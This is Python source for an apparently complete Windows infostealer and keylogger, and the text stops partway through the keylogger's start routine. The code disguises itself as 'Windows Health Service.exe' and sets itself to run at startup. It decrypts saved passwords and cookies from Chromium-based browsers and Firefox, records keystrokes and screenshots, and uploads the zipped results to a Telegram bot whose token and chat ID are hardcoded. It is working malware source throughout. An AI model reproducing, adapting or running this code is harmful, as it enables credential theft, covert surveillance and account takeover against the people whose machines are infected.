import hmac
import sys
import os

from psutil import process_iter
from base64 import b64decode
from ctypes import WinDLL
from json import loads
from platform import system, release, processor, node
from shutil import copy
from sqlite3 import connect
from time import asctime
from zipfile import ZipFile
from win32api import GetLogicalDriveStrings
from binascii import hexlify, unhexlify
from hashlib import sha1, pbkdf2_hmac
from optparse import OptionParser
from pathlib import Path
from struct import unpack
from threading import Timer
from keyboard import on_release, wait
from requests import get, post
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import DES3, AES
from Cryptodome.Util.Padding import unpad
from Cryptodome.Util.number import long_to_bytes
from pyautogui import screenshot
from pyasn1.codec.der import decoder
from wheel.cli.unpack import unpack

################################################################################
#                              LISTS AND CONSTANTS                             #
################################################################################

# list of future data files for packing to a zip archive
data_paths = []

# paths for appdata folders, with the name of the current user
LOCALAPPDATA_PATH = os.getenv('LOCALAPPDATA')
APPDATA_PATH = os.getenv('APPDATA')

# hash table with browser local data folders, with exe names for future task killing and names for txt data files
TARGET_LIST = {
    f'{LOCALAPPDATA_PATH}\\Google\\Chrome\\User Data\\': 'chrome',
    f'{APPDATA_PATH}\\Opera Software\\Opera Stable\\': 'opera',
    f'{APPDATA_PATH}\\Opera Software\\Opera GX Stable\\': 'opera',
    f'{LOCALAPPDATA_PATH}\\Microsoft\\Edge\\User Data\\': 'msedge',
    f'{LOCALAPPDATA_PATH}\\Yandex\\YandexBrowser\\User Data\\': 'yandex',
    f'{LOCALAPPDATA_PATH}\\Mail.Ru\\Atom\\User Data\\': 'atom',
    f'{LOCALAPPDATA_PATH}\\Chromium\\User Data\\': 'chromium'
}

# api key for telegram bot
TELEGRAM_API_KEY = "6105099290:AAE5S9dZ2-K-6djDpZlRyl_iDhgALdu4DgE"

# telegram group ID
TELEGRAM_CHAT_ID = "-1001894257707"

################################################################################
#                              BASIC SYSTEM INFECTION                          #
################################################################################
"""
    Two methods below are used for getting path of exe file - normal ways are not usable,
    if you want to do it normally, you will get wrong path
"""


# check system for frozen attribute(that is used for exe)
def we_are_frozen():
    return hasattr(sys, "frozen")


# if exe check is successful - return path of the current executable
def module_path():
    if we_are_frozen():
        return os.path.dirname(str(sys.executable))
    return os.path.dirname(str(__file__))


"""
    Simple infection below, made through injecting a malicious .bat to windows autorun folder and masking it as 
    Windows Health Service.exe for shits and giggles, and, of course, continuous keylogging with info updates.
    
    Infection makes the virus "live" in the system and automatically start itself every time the pc is powered on.
"""


def infect():
    # check if malware has not already self-copied
    if not os.path.exists(f'{LOCALAPPDATA_PATH}\\Temp\\Windows Health Service.exe'):
        # try except just as failsafe
        try:
            copy(f'{module_path()}\\FullMaster-BETA.exe',
                 f'{LOCALAPPDATA_PATH}\\Temp\\Windows Health Service.exe')
        except Exception as e:
            with open(f'{LOCALAPPDATA_PATH}\\ErrorFlag.txt', "w+") as errFile:
                errFile.write(str(e))
                report_file(errFile)

    # check if autorun is not already infected
    if not os.path.exists(f'{APPDATA_PATH}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autorun.bat'):
        # create and program autorun bat file
        with open(f'{APPDATA_PATH}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autorun.bat', "w+") as bat:
            bat.write('@echo off\n' +
                      f'@start {LOCALAPPDATA_PATH}\\Temp\\"Windows Health Service.exe"\n' +
                      '@exit')


################################################################################
#                              ALL DATA AND LOCATION                           #
################################################################################

# collect additional victim data
def collect_data():
    # drives
    drives = str(GetLogicalDriveStrings())
    drives = str(drives.split('\000')[:-1])

    # ip query through ipinfo.io web, try except is a failsafe for possible query limit
    try:
        endpoint = 'https://ipinfo.io/json'
        response = get(endpoint, verify=True)
        data = response.json()
    except Exception as e:
        data = str(e)

    # saving data to a txt
    all_data = "Time: " + asctime() + '\n' + "FS encoding: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + processor() + '\n' + \
               "System: " + system() + '\n' + release() + '\nIP: ' + str(data) + '\nDrives:' + drives

    with open(os.getenv("APPDATA") + '\\alldata.txt', "wb") as file:
        file.write(all_data.encode("utf-16", "replace"))

    data_paths.append(APPDATA_PATH + '\\alldata.txt')


################################################################################
#                 CHROMIUM BASED DECRYPTION AND SCRAPING METHODS               #
################################################################################

"""
    Four methods below are use to decrypt the key(two-staged decryption: base64 and CryptUnprotectData function)
    and to decrypt AES with given key encrypted value(such as passwords and cookies), that is used for encrypting data 
    in chromium-based browsers. This are taken from github, only with a little tweaking from me. 
    
    Except yandex browser - it is using an AES encryption, but on the exit we get binary trash - I have some ideas 
    why, but checking is tricky. I have already tried some(changed cutting of suffix bytes and tried different 
    encodings for db and it's values) and it was quite damn frustrating. Just FUCK both russia, and all yandex devs 
    in gachimuchi-style, really.
"""


def get_master_key(path):
    # get key from Local State file
    with open(path, encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)
    # base64 decoding
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    # removing DPAPI
    master_key = master_key[5:]
    # CryptUnprotectData function
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_value(buff, master_key):
    try:
        # cutting encrypted value
        iv = buff[3:15]
        payload = buff[15:]
        # generating AES cipher with value
        cipher = generate_cipher(master_key, iv)
        # decoding generated cipher with payload
        decrypted_pass = decrypt_payload(cipher, payload)
        # removing suffix bytes
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        # probably saved password from Chrome version older than v80
        return str(e).encode("utf-16", "replace")


"""
    Below there are custom methods for universal data extraction and decryption from Chromium-based browsers. Compatible
    with almost every desktop browser on the market, except: yandex(because fuck you russia), Firefox(it 
    has an entirely different realization in this project) and Safari(this code just not intended to work with Mac). 
    
    As parameters, function needs only a path to browser data folder, name of the profile folder, name of the exe process for 
    task killing(because cookie database can't be accessed when the process is running) and name for the output txt file. 
"""


# password and data files extraction extraction
def uni_pass_scrap(path, profile, exename, filename):
    # kill browser task for correct work and reliability
    if f'{exename}.exe' in (i.name() for i in process_iter()):
        os.system(f'taskkill /f /im {exename}.exe')

    # try to copy additional databases
    try:
        copy(path + profile + 'Web Data',
             path + profile + 'Web Data2')
        copy(path + profile + 'History',
             path + profile + 'History2')

        # saving database filenames to filename array
        data_paths.append(path + profile + 'Web Data2')
        data_paths.append(path + profile + 'History2')
    except Exception as e:
        with open(f'{LOCALAPPDATA_PATH}\\ErrorFlag.txt', "w+") as errFile:
            errFile.write(str(e))
            report_file(errFile)

    # the start of password extraction. Local state and Login data are copied and only then accessed, it is done for
    # further reliability, try except has been written for the same purpose
    try:
        # copy databases and get the AES key
        copy(path + 'Local State',
             path + 'Local State2')
        master_key = get_master_key(path + 'Local State2')

        copy(path + profile + 'Login Data',
             path + profile + 'Login Data2')

        # save main database filenames to filenames array
        data_paths.append(path + 'Local State2')
        data_paths.append(path + profile + 'Login Data2')

        # connect to Login data with sqlite3
        conn = connect(path + profile + 'Login Data2')
        # set automatic decoding through lambda function for the correct work with db elements, errors are ignored
        conn.text_factory = lambda b: b.decode(errors='ignore')
        # set cursor
        cursor = conn.cursor()
        # fetching needed columns with cursor
        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        # iterating through the fetched list of db values by one line
        for i in range(len(data)):
            # getting plaintext data
            origin_url, action_url, username, encrypted_password = data[i]
            # getting and decrypting password
            decrypted_password = decrypt_value(encrypted_password, master_key)
            # encoding it to the utf-16(for compatibility with all possible symbols in a login/password pair) and
            # writing data to the txt file
            with open(f'{APPDATA_PATH}\\{filename}', "ab") as file:
                file.write(
                    f'Origin URL: {origin_url}\nAction URL: {action_url} \nUser Name: {username} \nPassword: {decrypted_password} \n{"*" * 50} \n'.encode(
                        "utf-16", "replace"))
        cursor.close()

        # append all elements to list of extracted data files, for future packing into zip
        data_paths.append(f'{APPDATA_PATH}\\{filename}')
    except Exception as e:
        with open(f'{LOCALAPPDATA_PATH}\\ErrorFlag.txt', "w+") as errFile:
            errFile.write(str(e))
            report_file(errFile)


# cookies extraction uses the same logic
def uni_cookie_scrap(path, profile, exename, filename):
    if f'{exename}.exe' in (i.name() for i in process_iter()):
        os.system(f'taskkill /f /im {exename}.exe')

    data_paths.append(f'{APPDATA_PATH}\\{filename}')
    data_paths.append(path + profile + 'Network\\Cookies2')

    try:
        copy(path + profile + 'Network\\Cookies',
             path + profile + 'Network\\Cookies2')
        master_key = get_master_key(path + 'Local State2')

        conn = connect(path + profile + 'Network\\Cookies2')
        conn.text_factory = lambda b: b.decode(errors='ignore')
        cursor = conn.cursor()
        cursor.execute("SELECT creation_utc, host_key, name, encrypted_value, path, expires_utc FROM cookies")
        data = cursor.fetchall()

        for i in range(len(data)):
            time, host, name, encrypted_value, path, expires_utc = data[i]
            decr_value = decrypt_value(encrypted_value, master_key)
            with open(f'{APPDATA_PATH}\\{filename}', "ab") as file:
                file.write(
                    f'{str(time)} | {host} | {name} | {decr_value} | {path} | {str(expires_utc)} \n'.encode(
                        "utf-16", "replace"))
        cursor.close()
    except Exception as e:
        with open(f'{LOCALAPPDATA_PATH}\\ErrorFlag.txt', "w+") as errFile:
            errFile.write(str(e))
            report_file(errFile)


################################################################################
#                             LAUNCH SCRAPING                                  #
################################################################################

# data extraction from the list of target paths, realization is somewhat slow, I'm looking forward to optimize the cycle
def extract():
    # iterating through browser options
    for targetPath, filenames in zip(TARGET_LIST.keys(), TARGET_LIST.values()):

        # check if there are user profiles and they are not operas(it has different logic), and extract data from all
        # of them
        if not os.path.exists(targetPath + 'Default') and os.path.exists(targetPath) and not 'opera' in filenames:
            usedNames = []
            for root, dirs, files in os.walk(targetPath):
                for name in dirs:
                    if "Profile" in name and not name == 'System Profile' and not name == 'Guest Profile' and not name in usedNames:
                        uni_pass_scrap(targetPath, f'{name}\\', filenames, f'{filenames}_pass_{name}.txt')
                        uni_cookie_scrap(targetPath, f'{name}\\', filenames, f'{filenames}_cookie_{name}.txt')
                        usedNames.append(name)
                    else:
                        pass

        # check if no user profiles are created and extract data from default profile
        elif os.path.exists(targetPath + 'Default'):
            uni_pass_scrap(targetPath, 'Default\\', filenames, f'{filenames}_pass.txt')
            uni_cookie_scrap(targetPath, 'Default\\', filenames, f'{filenames}_cookie.txt')

        # check if browser is Opera GX, because of the different path logic
        elif os.path.exists(targetPath) and 'Opera GX' in targetPath:
            uni_pass_scrap(targetPath, '', filenames, f'{filenames}gx_pass.txt')
            uni_cookie_scrap(targetPath, '', filenames, f'{filenames}gx_cookie.txt')

        # check if browser is regular Opera, because of the different path logic
        elif os.path.exists(targetPath) and 'Opera' in targetPath:
            uni_pass_scrap(targetPath, '', filenames, f'{filenames}_pass.txt')
            uni_cookie_scrap(targetPath, '', filenames, f'{filenames}_cookie.txt')
        # in case of nothing of use is in disposition
        else:
            pass


# copied code from another github project, comments are not mine
################################################################################
#       FIREFOX Passwords (github code entirely - fucking black magic)         #
################################################################################
def getShortLE(d, a):
    return unpack('<H', (d)[a:a + 2])[0]


def getLongBE(d, a):
    return unpack('>L', (d)[a:a + 4])[0]


# minimal 'ASN1 to string' function for displaying Key3.db and key4.db contents
asn1Types = {0x30: 'SEQUENCE', 4: 'OCTETSTRING', 6: 'OBJECTIDENTIFIER', 2: 'INTEGER', 5: 'NULL'}
# http://oid-info.com/get/1.2.840.113549.2.9
oidValues = {b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',
             b'2a864886f70d0307': '1.2.840.113549.3.7 des-ede3-cbc',
             b'2a864886f70d010101': '1.2.840.113549.1.1.1 pkcs-1',
             b'2a864886f70d01050d': '1.2.840.113549.1.5.13 pkcs5 pbes2',
             b'2a864886f70d01050c': '1.2.840.113549.1.5.12 pkcs5 PBKDF2',
             b'2a864886f70d0209': '1.2.840.113549.2.9 hmacWithSHA256',
             b'60864801650304012a': '2.16.840.1.101.3.4.1.42 aes256-CBC'
             }


def printASN1(d, l, rl):
    type = d[0]
    length = d[1]
    if length & 0x80 > 0:  # http://luca.ntop.org/Teaching/Appunti/asn1.html,
        nByteLength = length & 0x7f
        length = d[2]
        # Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets.
        skip = 1
    else:
        skip = 0
        # print ('%x:%x' % ( type, length ))
    if type == 0x30:
        seqLen = length
        readLen = 0
        while seqLen > 0:
            # print(seqLen, hexlify(d[2+readLen:]))
            len2 = printASN1(d[2 + skip + readLen:], seqLen, rl + 1)
            # print('l2=%x' % len2)
            seqLen = seqLen - len2
            readLen = readLen + len2
        return length + 2
    elif type == 6:  # OID
        oidVal = hexlify(d[2:2 + length])
        return length + 2
    elif type == 4:  # OCTETSTRING
        return length + 2
    elif type == 5:  # NULL
        return length + 2
    elif type == 2:  # INTEGER
        return length + 2
    else:
        if length == l - 2:
            return length

        # extract records from a BSD DB 1.85, hash mode


# obsolete with Firefox 58.0.2 and NSS 3.35, as key4.db (SQLite) is used
def readBsddb(name):
    f = open(name, 'rb')
    # http://download.oracle.com/berkeley-db/db.1.85.tar.gz
    header = f.read(4 * 15)
    magic = getLongBE(header, 0)
    if magic != 0x61561:
        sys.exit()
    version = getLongBE(header, 4)
    if version != 2:
        sys.exit()
    pagesize = getLongBE(header, 12)
    nkeys = getLongBE(header, 0x38)

    readkeys = 0
    page = 1
    nval = 0
    val = 1
    db1 = []
    while (readkeys < nkeys):
        f.seek(pagesize * page)
        offsets = f.read((nkeys + 1) * 4 + 2)
        offsetVals = []
        i = 0
        nval = 0
        val = 1
        keys = 0
        while nval != val:
            keys += 1
            key = getShortLE(offsets, 2 + i)
            val = getShortLE(offsets, 4 + i)
            nval = getShortLE(offsets, 8 + i)
            # print 'key=0x%x, val=0x%x' % (key, val)
            offsetVals.append(key + pagesize * page)
            offsetVals.append(val + pagesize * page)
            readkeys += 1
            i += 4
        offsetVals.append(pagesize * (page + 1))
        valKey = sorted(offsetVals)
        for i in range(keys * 2):
            # print '%x %x' % (valKey[i], valKey[i+1])
            f.seek(valKey[i])
            data = f.read(valKey[i + 1] - valKey[i])
            db1.append(data)
        page += 1
        # print 'offset=0x%x' % (page*pagesize)
    f.close()
    db = {}

    for i in range(0, len(db1), 2):
        db[db1[i + 1]] = db1[i]
    return db


def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    # see http://www.drh-consultancy.demon.co.uk/key3.html
    hp = sha1(globalSalt + masterPassword).digest()
    pes = entrySalt + b'\x00' * (20 - len(entrySalt))
    chp = sha1(hp + entrySalt).digest()
    k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
    tk = hmac.new(chp, pes, sha1).digest()
    k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
    k = k1 + k2
    iv = k[-8:]
    key = k[:24]
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)


def decodeLoginData(data):
    '''
    SEQUENCE {
      OCTETSTRING b'f8000000000000000000000000000001'
      SEQUENCE {
        OBJECTIDENTIFIER 1.2.840.113549.3.7 des-ede3-cbc
        OCTETSTRING iv 8 bytes
      }
      OCTETSTRING encrypted
    }
    '''
    asn1data = decoder.decode(b64decode(data))  # first base64 decoding, then ASN1DERdecode
    key_id = asn1data[0][0].asOctets()
    iv = asn1data[0][1][1].asOctets()
    ciphertext = asn1data[0][2].asOctets()
    return key_id, iv, ciphertext


def getLoginData():
    logins = []
    sqlite_file = options.directory / 'signons.sqlite'
    json_file = options.directory / 'logins.json'
    if json_file.exists():  # since Firefox 32, json is used instead of sqlite3
        loginf = open(json_file, 'r').read()
        jsonLogins = loads(loginf)
        if 'logins' not in jsonLogins:
            return []
        for row in jsonLogins['logins']:
            encUsername = row['encryptedUsername']
            encPassword = row['encryptedPassword']
            logins.append((decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']))
        return logins
    elif sqlite_file.exists():  # firefox < 32
        conn = connect(sqlite_file)
        c = conn.cursor()
        c.execute("SELECT * FROM moz_logins;")
        for row in c:
            encUsername = row[6]
            encPassword = row[7]
            logins.append((decodeLoginData(encUsername), decodeLoginData(encPassword), row[1]))
        return logins
    else:
        pass


CKA_ID = unhexlify('f8000000000000000000000000000001')


def extractSecretKey(masterPassword, keyData):  # 3DES
    # see http://www.drh-consultancy.demon.co.uk/key3.html
    pwdCheck = keyData[b'password-check']
    entrySaltLen = pwdCheck[1]
    entrySalt = pwdCheck[3: 3 + entrySaltLen]
    encryptedPasswd = pwdCheck[-16:]
    globalSalt = keyData[b'global-salt']
    cleartextData = decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedPasswd)
    if cleartextData != b'password-check\x02\x02':
        sys.exit()

    if CKA_ID not in keyData:
        return None
    privKeyEntry = keyData[CKA_ID]
    saltLen = privKeyEntry[1]
    nameLen = privKeyEntry[2]
    # print 'saltLen=%d nameLen=%d' % (saltLen, nameLen)
    privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
    data = privKeyEntry[3 + saltLen + nameLen:]
    # see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
    '''
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
         SEQUENCE {
           OCTETSTRING entrySalt
           INTEGER 01
         }
       }
       OCTETSTRING privKeyData
     }
    '''
    entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
    privKeyData = privKeyEntryASN1[0][1].asOctets()
    privKey = decryptMoz3DES(globalSalt, masterPassword, entrySalt, privKeyData)
    '''
     SEQUENCE {
       INTEGER 00
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.1.1 pkcs-1
         NULL 0
       }
       OCTETSTRING prKey seq
     }
    '''
    privKeyASN1 = decoder.decode(privKey)
    prKey = privKeyASN1[0][2].asOctets()
    '''
     SEQUENCE {
       INTEGER 00
       INTEGER 00f8000000000000000000000000000001
       INTEGER 00
       INTEGER 3DES_private_key
       INTEGER 00
       INTEGER 00
       INTEGER 00
       INTEGER 00
       INTEGER 15
     }
    '''
    prKeyASN1 = decoder.decode(prKey)
    id = prKeyASN1[0][1]
    key = long_to_bytes(prKeyASN1[0][3])
    return key


def decryptPBE(decodedItem, masterPassword, globalSalt):
    pbeAlgo = str(decodedItem[0][0][0])
    if pbeAlgo == '1.2.840.113549.1.12.5.1.3':  # pbeWithSha1AndTripleDES-CBC
        """
         SEQUENCE {
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
             SEQUENCE {
               OCTETSTRING entry_salt
               INTEGER 01
             }
           }
           OCTETSTRING encrypted
         }
        """
        entrySalt = decodedItem[0][0][1][0].asOctets()
        cipherT = decodedItem[0][1].asOctets()
        key = decryptMoz3DES(globalSalt, masterPassword, entrySalt, cipherT)
        return key[:24], pbeAlgo
    elif pbeAlgo == '1.2.840.113549.1.5.13':  # pkcs5 pbes2
        # https://phabricator.services.mozilla.com/rNSSfc636973ad06392d11597620b602779b4af312f6
        '''
        SEQUENCE {
          SEQUENCE {
            OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
            SEQUENCE {
              SEQUENCE {
                OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
                SEQUENCE {
                  OCTETSTRING 32 bytes, entrySalt
                  INTEGER 01
                  INTEGER 20
                  SEQUENCE {
                    OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
                  }
                }
              }
              SEQUENCE {
                OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
                OCTETSTRING 14 bytes, iv 
              }
            }
          }
          OCTETSTRING encrypted
        }
        '''
        assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
        assert str(decodedItem[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
        assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
        # https://tools.ietf.org/html/rfc8018#page-23
        entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
        iterationCount = int(decodedItem[0][0][1][0][1][1])
        keyLength = int(decodedItem[0][0][1][0][1][2])
        assert keyLength == 32

        k = sha1(globalSalt + masterPassword).digest()
        key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)

        iv = b'\x04\x0e' + decodedItem[0][0][1][1][
            1].asOctets()  # https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
        # 04 is OCTETSTRING, 0x0e is length == 14
        cipherT = decodedItem[0][1].asOctets()
        clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

        return clearText, pbeAlgo


def getKey(masterPassword, directory):
    os.chdir(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles')
    for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
        for name in dirs:
            if "release" in name:
                os.chdir(os.getcwd() + '\\' + name)
                conn = connect(directory / 'key4.db')  # firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
                c = conn.cursor()
                # first check password
                c.execute("SELECT item1,item2 FROM metaData WHERE id = 'password';")
                row = c.fetchone()
                globalSalt = row[0]  # item1
                item2 = row[1]
                decodedItem2 = decoder.decode(item2)
                clearText, algo = decryptPBE(decodedItem2, masterPassword, globalSalt)

        if clearText == b'password-check\x02\x02':
            c.execute("SELECT a11,a102 FROM nssPrivate;")
            for row in c:
                if row[0] != None:
                    break
            a11 = row[0]  # CKA_VALUE
            a102 = row[1]
            if a102 == CKA_ID:
                decoded_a11 = decoder.decode(a11)
                # decrypt master key
                clearText, algo = decryptPBE(decoded_a11, masterPassword, globalSalt)
                return clearText[:24], algo
            else:
                pass
        return None, None


parser = OptionParser(usage="usage: %prog [options]")
parser.add_option("-v", "--verbose", type="int", dest="verbose", help="verbose level", default=0)
parser.add_option("-p", "--password", type="string", dest="masterPassword", help="masterPassword", default='')
parser.add_option("-d", "--dir", type="string", dest="directory", help="directory", default='')
(options, args) = parser.parse_args()
options.directory = Path(options.directory)


def firefoxPass():
    key, algo = getKey(options.masterPassword.encode(), options.directory)
    file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "wb")
    if key == None:
        sys.exit()
    # print(hexlify(key))
    logins = getLoginData()
    if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
        for i in logins:
            assert i[0][0] == CKA_ID
            file.write(("URL: " + '%20s:' % (i[2]) + '\n').encode("utf-16", "replace"))  # site URL
            iv = i[0][1]
            ciphertext = i[0][2]
            file.write(
                ("Login: " + str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8)) + '\n').encode(
                    "utf-16",
                    "replace"))
            iv = i[1][1]
            ciphertext = i[1][2]
            file.write(
                ("Password: " + str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8)) + '\n').encode(
                    "utf-16",
                    "replace"))
    file.close()


################################################################################
#                              FIREFOX Cookies                                 #
################################################################################

# end of the fucking github black magic - now mostly my code standard cookie extraction, but without decoding and,
# because of it, uni_cookie_scrap() is not used, due to Firefox storing cookies in plaintext
def firefoxCookie():
    for root, dirs, files in os.walk(f'{APPDATA_PATH}\\Mozilla\\Firefox\\Profiles'):
        for name in dirs:
            if "release" in name:
                conn = connect(
                    APPDATA_PATH + '\\Mozilla\\Firefox\\Profiles\\' + name + '\\cookies.sqlite')
                cursor = conn.cursor()
                cursor.execute("SELECT id, name, value, host FROM moz_cookies")
                data = cursor.fetchall()
                for i in range(len(data)):
                    id, name, value, host = data[i]
                    with open(APPDATA_PATH + '\\firefox_cookie.txt', "ab") as file:
                        file.write(
                            (str(id) + ' | ' + host + ' | ' + name + ' | ' + value + ' | ' + '\n').encode("utf-16", "replace"))
                data_paths.append(APPDATA_PATH + '\\firefox_cookie.txt')


""" 
    Getting screenshot, I was thinking about dynamic screenshotting based on the running processes and opened windows, 
    mainly for leaking chats from various messangers. Please don't even ask for what I would have used these screens
"""


################################################################################
#                             SCREEN                                           #
################################################################################
def screen():
    snapshot = screenshot()
    snapshot.save(os.getenv('LOCALAPPDATA') + '\\Temp\\screenshot.jpg')
    return os.getenv('LOCALAPPDATA') + '\\Temp\\screenshot.jpg'


################################################################################
#                             REPORT TO GROUP WITH BOT                         #
################################################################################

""" 
    I am using a simple bot, created with BotFather, that has basically no special functions. It just was added to the 
    telegram group with admin rights. 
    
    Try except is for the reliability - request can call an exception in case of the bad and unstable connection, which 
    can be a problem, when your victim is located in such cursed places as Donbas or Berdyansk.
"""


def report_file(file):
    # hash map with file, such realization is used because it is more simple, pleasing to the eye and integrates
    # seamlessly to the https request
    files = {'document': open(file, 'rb')}

    try:
        # standard telegram API is used for file sending through https POST request, with added bot API key,
        # message type, and group chat id with -100 prefix(that is needed by standard), and a hash map with file
        post(
            f'https://api.telegram.org/{TELEGRAM_API_KEY}/sendDocument?chat_id={TELEGRAM_CHAT_ID}',
            files=files
        )
    except Exception as e:
        with open(f'{LOCALAPPDATA_PATH}\\ErrorFlag.txt', "w+") as errFile:
            errFile.write(str(e))
            report_file(errFile)


################################################################################
#                              PACKING AND SENDING                             #
################################################################################

# simple algorithm for packing data files to a .zip archive, uses data_paths list for getting path of every needed file
def pack_n_send():
    with ZipFile(f'{LOCALAPPDATA_PATH}\\Temp\\LOG.zip', 'w') as NZ:
        for logs in data_paths:
            if os.path.exists(logs):
                NZ.write(logs)

    report_file(f'{LOCALAPPDATA_PATH}\\Temp\\LOG.zip')


################################################################################
#                              KEYLOGGER CLASS                                 #
################################################################################
class Keylogger:
    def __init__(self, interval, hostname):
        # variable for current key
        self.log = None
        # variable for logfile path
        self.logfile = None

        # self-explainable constants
        self.INTERVAL = interval
        self.HOSTNAME = hostname
        # catch the keyboard layout that was used on the keylogger startup
        self.STARTUP_LAYOUT = self.catch_layout()

        # arrays of keyboard keys for en/ru language pair, used as "masks" for logging, due to event system logic,
        # that is explained in the callback function comments
        self.ru = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '"', '№', ';', ':', '?',
                   'й', 'ц', 'у', 'к', 'е', 'н', 'г', 'ш', 'щ', 'з', 'х', 'ъ', 'ф', 'ы', 'в', 'а',
                   'п', 'р', 'о', 'л', 'д', 'ж', 'э', 'я', 'ч', 'с', 'м', 'и', 'т', 'ь', 'б', 'ю',
                   '.',
                   'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'Ф', 'Ы', 'В', 'А',
                   'П', 'Р', 'О', 'Л', 'Д', 'Ж', 'Э', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б',
                   'Ю', ',', 'ё', 'Ё']

        self.en = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '@', '#', '$', '^', '&',
                   'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 'a', 's', 'd', 'f',
                   'g', 'h', 'j', 'k', 'l', ';', "'", 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.',
                   '/',
                   'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', 'A', 'S', 'D', 'F',
                   'G', 'H', 'J', 'K', 'L', ':', '"', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<',
                   '>', '?', '`', '~']

    # catch layout hex identifier
    @staticmethod
    def catch_layout():
        user32 = WinDLL('user32', use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
        key_lang_id = user32.GetKeyboardLayout(thread_id)
        lang_id = key_lang_id & (2 ** 16 - 1)
        lang_id_hex = hex(lang_id)
        if lang_id_hex == '0x409':
            return 'EN'
        elif lang_id_hex == '0x419':
            return 'RU'
        else:
            return 'ERR'

    def callback(self, event):
        """
            This callback is invoked whenever a keyboard event is occured(when a key is released, in this example).

            Event keylogging is a bit strange - it does not register language change after program startup, so I used a
            system with layout pairs(startup and current) and en/ru key arrays as "masks" for logging.

            Index of the startup layout key in the array is passed to the current layout array and the key on that index is
            written to the self.log variable, that is written to the self.logfile txt file. If startup and current are the
            same - it just writes an event key to the variable with no manipulation.

            I'm looking to switch for another, more optimized solution(that works universally not only for en/ru pair),
            but this will work for now.
        """

        # set current layout and pressed key
        current_layout = self.catch_layout()
        key = event.name

        # check if key is a special key or space
        if len(key) > 1:
            if key == 'space':
                self.log = ' '
            else:
                self.log = "[" + key.upper() + "]"

        # check if key is a regular key
        else:
            # if startup and current languages are the same - just don't bother and write the event key
            if self.STARTUP_LAYOUT == current_layout:
                self.log = key

            # if there is a difference - write a key from the current layout array on the index of the startup one
            else:
                if self.STARTUP_LAYOUT == 'RU':
                    self.log = self.en[self.ru.index(key)]
                else:
                    self.log = self.ru[self.en.index(key)]

        # write and reset self.log variable
        with open(self.logfile, "ab") as log:
            log.write(self.log.encode("utf-16", "replace"))

        self.log = None

    # report data and set continuous reporting with a given interval
    def report(self):
        timer = Timer(interval=self.INTERVAL, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

        # report file filled by callback method and reset logfile
        report_file(self.logfile)
        report_file(screen())
        self.create_logfile()

    # construct the filename to be identified by hostname, and write the current date with time to it
    def create_logfile(self):
        path = f'{os.getenv("LOCALAPPDATA")}\\Temp\\{self.HOSTNAME}.txt'
        self.logfile = path

        with open(path, 'wb') as file:
            file.write((asctime() + '\n').encode("utf-16"))

    # start the whole thing
    def start_logging(self):
        # if victim's pc finished work before sending - the logfile is saved and sent on the next pc startup,
